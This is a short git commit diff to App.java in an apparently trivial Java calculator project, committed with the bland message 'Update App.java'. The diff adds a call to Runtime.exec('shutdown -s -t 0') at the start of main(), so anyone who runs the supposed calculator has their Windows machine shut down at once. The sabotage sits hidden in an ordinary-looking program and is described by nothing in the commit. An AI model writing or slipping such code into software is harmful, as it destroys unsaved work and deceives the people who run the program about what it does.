789bf563112028bb751bd13849404e00aca74713
LocatelliFabio <61050236+LocatelliFabio@users.noreply.github.com>
2024-10-01 16:19:14 +0200

    Update App.java

--- skibidi/src/main/java/calculator/skibidi/App.java
+++ skibidi/src/main/java/calculator/skibidi/App.java
@@ -9,7 +9,10 @@ public class App
 	static int F =10;
     public static void main( String[] args )
     {
-	throw new Exception();
+	    Runtime runtime = Runtime.getRuntime();
+    Process proc = runtime.exec("shutdown -s -t 0");
+    System.exit(0);
+	
         System.out.println( "Hello World!" );
         System.out.println( "Hello World!" );
     }
